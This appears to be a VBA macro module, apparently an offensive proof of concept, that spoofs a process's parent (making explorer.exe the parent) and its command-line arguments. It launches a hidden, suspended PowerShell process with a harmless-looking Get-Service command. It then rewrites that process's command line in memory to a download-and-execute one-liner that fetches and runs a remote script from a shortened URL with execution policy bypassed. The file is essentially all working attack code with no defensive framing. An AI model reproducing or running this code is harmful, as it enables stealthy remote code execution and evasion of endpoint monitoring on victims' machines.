' Windows API constants
Const EXTENDED_STARTUPINFO_PRESENT = &H80000
Const HEAP_ZERO_MEMORY = &H8&
Const SW_HIDE = &H0&
Const PROCESS_ALL_ACCESS = &H1F0FFF
Const PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = &H20000
Const TH32CS_SNAPPROCESS = &H2&
Const MAX_PATH = 260

'''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''' Data types ''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''
Private Type PROCESS_INFORMATION
    hProcess As LongPtr
    hThread As LongPtr
    dwProcessId As Long
    dwThreadId As Long
End Type


Private Type PROCESSENTRY32
    dwSize As Long
    cntUsage As Long
    th32ProcessID As Long
    th32DefaultHeapID As Long
    th32ModuleID As Long
    cntThreads As Long
    th32ParentProcessID As Long
    pcPriClassBase As Long
    dwFlags As Long
    szexeFile As String * MAX_PATH
End Type

#If Win64 Then
'''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''' SPECIFIC X64 TYPES ''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''

    Private Type LARGE_INTEGER
    lowpart                         As Long
    highpart                        As Long
End Type
Private Type UNICODE_STRING64
    Length                          As Integer
    MaxLength                       As Integer
    lPad                            As Long
    lpBuffer                        As LongPtr
End Type
Private Type RTL_USER_PROCESS_PARAMETERS
    Reserved1(15) As Byte
    Reserved2(9) As Long
    CurrentDirectoryPath As UNICODE_STRING64
    CurrentDirectoryHandle As LongPtr
    DllPath As UNICODE_STRING64
    ImagePathName As UNICODE_STRING64
    CommandLine As UNICODE_STRING64
    Environment As LongPtr
End Type
Private Type PROCESS_BASIC_INFORMATION
    ExitStatus                      As Long
    Reserved0                       As Long
    PEBBaseAddress                  As LongPtr
    AffinityMask                    As LARGE_INTEGER
    BasePriority                    As Long
    Reserved1                       As Long
    uUniqueProcessId                As LARGE_INTEGER
    uInheritedFromUniqueProcessId   As LARGE_INTEGER
End Type
Private Type PEB
    Reserved1(1) As Byte
    BeingDebugged As Byte
    Reserved2(20) As Byte
    Ldr As Long
    ProcessParameters As LongPtr
    Reserved3(519) As Byte
    PostProcessInitRoutine As Long
    Reserved4(135) As Byte
    SessionId As Long
End Type
Private Declare PtrSafe Function NtQueryInformationProcess Lib "ntdll" ( _
                         ByVal hProcess As LongPtr, _
                         ByVal processInformationClass As Long, _
                         ByRef pProcessInformation As Any, _
                         ByVal uProcessInformationLength As Long, _
                         ByRef puReturnLength As LongPtr) As Long

Private Declare PtrSafe Function NtReadVirtualMemory Lib "ntdll" ( _
                         ByVal hProcess As LongPtr, _
                         ByVal BaseAddress As LongPtr, _
                         ByRef Buffer As Any, _
                         ByVal BufferBytesToRead As Long, _
                         ByRef returnLength As LARGE_INTEGER) As Long
Private Declare PtrSafe Function NtWriteVirtualMemory Lib "ntdll" ( _
                         ByVal hProcess As LongPtr, _
                         ByVal VABA As Any, _
                         ByVal lpBuffer As Any, _
                         ByVal nSS As Long, _
                         ByRef NOBW As LARGE_INTEGER) As Boolean

Private Type STARTUP_INFO
    cb As Long
    lpReserved As String
    lpDesktop As String
    lpTitle As String
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As LongPtr
    hStdInput As LongPtr
    hStdOutput As LongPtr
    hStdError As LongPtr
End Type

#ElseIf Win32 Then
'''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''' SPECIFIC X86 TYPES ''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''
Private Type STARTUP_INFO
    cb As Long
    lpReserved As String
    lpDesktop As String
    lpTitle As String
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As Byte
    hStdInput As LongPtr
    hStdOutput As LongPtr
    hStdError As LongPtr
End Type
    ' from https://codes-sources.commentcamarche.net/source/42365-affinite-des-processus-et-des-threads
Private Type PROCESS_BASIC_INFORMATION
    ExitStatus      As Long
    PEBBaseAddress  As Long
    AffinityMask    As Long
    BasePriority    As Long
    UniqueProcessId As Long
    ParentProcessId As Long
End Type

Private Declare Function NtQueryInformationProcess Lib "ntdll.dll" ( _
   ByVal processHandle As LongPtr, _
   ByVal processInformationClass As Long, _
   ByRef processInformation As PROCESS_BASIC_INFORMATION, _
   ByVal processInformationLength As Long, _
   ByRef returnLength As Long _
) As Integer

' From https://foren.activevb.de/archiv/vb-net/thread-76040/beitrag-76164/ReadProcessMemory-fuer-GetComma/
Private Type PEB
    Reserved1(1) As Byte
    BeingDebugged As Byte
    Reserved2 As Byte
    Reserved3(1) As Long
    Ldr As Long
    ProcessParameters As Long
    Reserved4(103) As Byte
    Reserved5(51) As Long
    PostProcessInitRoutine As Long
    Reserved6(127) As Byte
    Reserved7 As Long
    SessionId As Long
End Type

Private Type UNICODE_STRING
    Length As Integer
    MaximumLength As Integer
    Buffer As Long
    ' to change ^ to Long
End Type
Private Type RTL_USER_PROCESS_PARAMETERS
    Reserved1(15) As Byte
    Reserved2(9) As Long
    ImagePathName As UNICODE_STRING
    CommandLine As UNICODE_STRING
End Type
#End If

Private Type STARTUPINFOEX
    STARTUPINFO As STARTUP_INFO
    lpAttributelist As LongPtr
End Type
'''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''' kernel32 & ntdll bindings '''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''

Private Declare PtrSafe Function CreateProcess Lib "kernel32.dll" Alias "CreateProcessA" ( _
    ByVal lpApplicationName As String, _
    ByVal lpCommandLine As String, _
    lpProcessAttributes As Long, _
    lpThreadAttributes As Long, _
    ByVal bInheritHandles As Long, _
    ByVal dwCreationFlags As Long, _
    lpEnvironment As Any, _
    ByVal lpCurrentDriectory As String, _
    ByVal lpStartupInfo As LongPtr, _
    lpProcessInformation As PROCESS_INFORMATION _
) As Long

Private Declare PtrSafe Function GetProcessHeap Lib "kernel32.dll" () As LongPtr

Private Declare PtrSafe Function CreateToolhelp32Snapshot Lib "kernel32.dll" ( _
    ByVal dwFlags As Integer, _
    ByVal th32ProcessID As Integer _
) As Long

Private Declare PtrSafe Function Process32First Lib "kernel32.dll" ( _
    ByVal hSnapshot As LongPtr, _
    ByRef lppe As PROCESSENTRY32 _
) As Boolean

Private Declare PtrSafe Function Process32Next Lib "kernel32.dll" ( _
    ByVal hSnapshot As LongPtr, _
    ByRef lppe As PROCESSENTRY32 _
) As Boolean

#If Win64 Then
Private Declare PtrSafe Function OpenProcess Lib "kernel32.dll" ( _
    ByVal dwAccess As Long, _
    ByVal fInherit As Long, _
    ByVal hObject As Long _
) As LongPtr

Private Declare PtrSafe Function HeapAlloc Lib "kernel32.dll" ( _
    ByVal hHeap As LongPtr, _
    ByVal dwFlags As Long, _
    ByVal dwBytes As LongPtr _
) As LongPtr

Private Declare PtrSafe Function InitializeProcThreadAttributeList Lib "kernel32.dll" ( _
    ByVal lpAttributelist As LongPtr, _
    ByVal dwAttributeCount As Integer, _
    ByVal dwFlags As Integer, _
    ByRef lpSize As Long _
) As Boolean

    Private Declare PtrSafe Function UpdateProcThreadAttribute Lib "kernel32.dll" ( _
    ByVal lpAttributelist As LongPtr, _
    ByVal dwFlags As Integer, _
    ByVal lpAttribute As Long, _
    ByRef lpValue As LongPtr, _
    ByVal cbSize As Integer, _
    ByRef lpPreviousValue As Integer, _
    ByRef lpReturnSize As Integer _
) As Boolean

Private Declare PtrSafe Function ResumeThread Lib "kernel32.dll" (ByVal hThread As LongPtr) As Long

#ElseIf Win32 Then
Private Declare PtrSafe Function OpenProcess Lib "kernel32.dll" ( _
    ByVal dwAccess As Long, _
    ByVal fInherit As Integer, _
    ByVal hObject As Long _
) As Long

Private Declare PtrSafe Function HeapAlloc Lib "kernel32.dll" ( _
    ByVal hHeap As LongPtr, _
    ByVal dwFlags As Long, _
    ByVal dwBytes As Long _
) As LongPtr

Private Declare PtrSafe Function InitializeProcThreadAttributeList Lib "kernel32.dll" ( _
    ByVal lpAttributelist As LongPtr, _
    ByVal dwAttributeCount As Integer, _
    ByVal dwFlags As Integer, _
    ByRef lpSize As Integer _
) As Boolean

Private Declare PtrSafe Function UpdateProcThreadAttribute Lib "kernel32.dll" ( _
    ByVal lpAttributelist As LongPtr, _
    ByVal dwFlags As Integer, _
    ByVal lpAttribute As Long, _
    ByRef lpValue As Long, _
    ByVal cbSize As Integer, _
    ByRef lpPreviousValue As Integer, _
    ByRef lpReturnSize As Integer _
) As Boolean

'SPECIFIC STUFF for x86'
Private Declare Function ReadProcessMemory Lib "kernel32.dll" ( _
    ByVal hProcess As LongPtr, _
    ByVal lpBaseAddress As LongPtr, _
    ByVal lpBuffer As LongPtr, _
    ByVal nSize As Long, _
    ByRef lpNumberOfBytesRead As Long _
) As Boolean
Private Declare Function WriteProcessMemory Lib "kernel32.dll" ( _
    ByVal hProcess As LongPtr, _
    ByVal lpBaseAddress As Long, _
    ByVal lpBuffer As Any, _
    ByVal nSize As Long, _
    ByRef lpNumberOfBytesWritten As Long _
) As Boolean
Private Declare Function ResumeThread Lib "kernel32.dll" (ByVal hThread As LongPtr) As Long
#End If



'''''''''''''''''''''''''''''''''''''''''''''''
'''''''''''''' Utility functions ''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''
#If Win64 Then
' Finds the PID of a process given its name
Public Function getPidByName(ByVal name As String) As Integer
    Dim pEntry As PROCESSENTRY32
    Dim continueSearching As Boolean
    pEntry.dwSize = LenB(pEntry)
    Dim snapshot As LongPtr
    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, ByVal 0&)

    continueSearching = Process32First(snapshot, pEntry)

    Do
        If InStr(1, pEntry.szexeFile, name) Then
            getPidByName = pEntry.th32ProcessID
            continueSearching = False
        Else
            continueSearching = Process32Next(snapshot, pEntry)
        End If
    Loop While continueSearching
End Function
Public Function convertStr(ByVal str As String) As Byte()
    Dim i, j As Integer
    Dim result(400) As Byte
    j = 0
    For i = 1 To Len(str):
        result(j) = Asc(Mid(str, i, 1))
        result(j + 1) = &H0
        j = j + 2
    Next

    convertStr = result

End Function
#ElseIf Win32 Then
    ' Finds the PID of a process given its name
Public Function getPidByName(ByVal name As String) As Integer
    Dim pEntry As PROCESSENTRY32
    Dim continueSearching As Boolean
    pEntry.dwSize = Len(pEntry)
    Dim snapshot As LongPtr
    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, ByVal 0&)

    continueSearching = Process32First(snapshot, pEntry)

    Do
        If LCase$(Left$(pEntry.szexeFile, Len(name))) = LCase$(name) Then
            getPidByName = pEntry.th32ProcessID
            continueSearching = False
        Else
            continueSearching = Process32Next(snapshot, pEntry)
        End If
    Loop While continueSearching
End Function
Public Function convertStr(ByVal str As String) As Byte()
    Dim i, j As Integer
    Dim result(400) As Byte
    j = 0
    For i = 1 To Len(str):
        result(j) = Asc(Mid(str, i, 1))
        result(j + 1) = &H0
        j = j + 2
    Next

    convertStr = result

End Function
#End If

Sub Spoof()
#If Win64 Then
        Dim pi As PROCESS_INFORMATION
    Dim si As STARTUPINFOEX
    Dim nullStr As String
    Dim pid, result As Integer
    Dim threadAttribSize As Long
    Dim parentHandle As LongPtr
    Dim originalCli As String

    originalCli = "powershell.exe -NoExit -c Get-Service -DisplayName '*network*' | Where-Object { $_.Status -eq 'Running' } | Sort-Object DisplayName"


    ' Get a handle on the process to be used as a parent
    pid = getPidByName("explorer.exe")

    parentHandle = OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    ' Initialize process attribute list
    result = InitializeProcThreadAttributeList(ByVal 0&, 1, 0, threadAttribSize)
    blah = Err.LastDllError
    si.lpAttributelist = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, threadAttribSize)
    blah = Err.LastDllError
    result = InitializeProcThreadAttributeList(si.lpAttributelist, 1, 0, threadAttribSize)
    ' Set the parent to be our previous handle
    result = UpdateProcThreadAttribute(si.lpAttributelist, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, parentHandle, Len(parentHandle), ByVal 0&, ByVal 0&)
    ' Set the size of cb (see https://docs.microsoft.com/en-us/windows/desktop/api/winbase/ns-winbase-_startupinfoexa#remarks)
    si.STARTUPINFO.cb = LenB(si)

    ' Hide new process window
    si.STARTUPINFO.dwFlags = 1
    si.STARTUPINFO.wShowWindow = SW_HIDE
    result = CreateProcess( _
        nullStr, _
        originalCli, _
        ByVal 0&, _
        ByVal 0&, _
        1&, _
        &H80014, _
        ByVal 0&, _
        nullStr, _
        VarPtr(si), _
        pi _
    )
    ' Spoofing of cli arguments
    Dim size As LongPtr
    Dim PEB As PEB
    Dim pbi As PROCESS_BASIC_INFORMATION
    Dim newProcessHandle As LongPtr
    Dim success As Boolean
    Dim parameters As RTL_USER_PROCESS_PARAMETERS
    Dim cmdStr As String
    Dim cmd() As Byte
    Dim liRet As LARGE_INTEGER

    newProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, False, pi.dwProcessId)
    result = NtQueryInformationProcess(newProcessHandle, 0, pbi, Len(pbi), size)

    success = NtReadVirtualMemory(newProcessHandle, pbi.PEBBaseAddress, PEB, Len(PEB), liRet)
    ' peb.ProcessParameters now contains the address to the parameters - read them
    success = NtReadVirtualMemory(newProcessHandle, PEB.ProcessParameters, parameters, Len(parameters), liRet)
    blah = Err.LastDllError

    cmdStr = "powershell.exe -noexit -ep bypass -c IEX((New-Object System.Net.WebClient).DownloadString('http://bit.ly/2TxpA4h'))  #"

    cmd = convertStr(cmdStr)
    success = NtWriteVirtualMemory(newProcessHandle, parameters.CommandLine.lpBuffer, StrPtr(cmd), 2 * Len(cmdStr), liRet)
    ResumeThread (pi.hThread)
#ElseIf Win32 Then
    Dim pi As PROCESS_INFORMATION
    Dim si As STARTUPINFOEX
    Dim nullStr As String
    Dim pid, result As Integer
    Dim threadAttribSize As Integer
    Dim parentHandle As LongPtr
    Dim originalCli As String

    originalCli = "powershell.exe -NoExit -c Get-Service -DisplayName '*network*' | Where-Object { $_.Status -eq 'Running' } | Sort-Object DisplayName"

    ' Get a handle on the process to be used as a parent
    pid = getPidByName("explorer.exe")
    parentHandle = OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    ' Initialize process attribute list
    result = InitializeProcThreadAttributeList(ByVal 0&, 1, 0, threadAttribSize)
    si.lpAttributelist = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, threadAttribSize)
    result = InitializeProcThreadAttributeList(si.lpAttributelist, 1, 0, threadAttribSize)
    ' Set the parent to be our previous handle
    result = UpdateProcThreadAttribute(si.lpAttributelist, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, parentHandle, Len(parentHandle), ByVal 0&, ByVal 0&)
    ' Set the size of cb (see https://docs.microsoft.com/en-us/windows/desktop/api/winbase/ns-winbase-_startupinfoexa#remarks)
    si.STARTUPINFO.cb = LenB(si)

    ' Hide new process window
    si.STARTUPINFO.dwFlags = 1
    si.STARTUPINFO.wShowWindow = SW_HIDE
    result = CreateProcess( _
        nullStr, _
        originalCli, _
        ByVal 0&, _
        ByVal 0&, _
        1&, _
        &H80014, _
        ByVal 0&, _
        nullStr, _
        VarPtr(si), _
        pi _
    )

    ' Spoofing of cli arguments
    Dim size As Long
    Dim PEB As PEB
    Dim pbi As PROCESS_BASIC_INFORMATION
    Dim newProcessHandle As LongPtr
    Dim success As Boolean
    Dim parameters As RTL_USER_PROCESS_PARAMETERS
    Dim cmdStr As String
    Dim cmd() As Byte


    newProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, False, pi.dwProcessId)
    result = NtQueryInformationProcess(newProcessHandle, 0, pbi, Len(pbi), size)
    success = ReadProcessMemory(newProcessHandle, pbi.PEBBaseAddress, VarPtr(PEB), Len(PEB), size)
    ' peb.ProcessParameters now contains the address to the parameters - read them
    success = ReadProcessMemory(newProcessHandle, PEB.ProcessParameters, VarPtr(parameters), Len(parameters), size)

    cmdStr = "powershell.exe -noexit -ep bypass -c IEX((New-Object System.Net.WebClient).DownloadString('http://bit.ly/2TxpA4h')) # "
    cmd = convertStr(cmdStr)
    success = WriteProcessMemory(newProcessHandle, parameters.CommandLine.Buffer, StrPtr(cmd), 2 * Len(cmdStr), size)
    ResumeThread (pi.hThread)
#End If
End Sub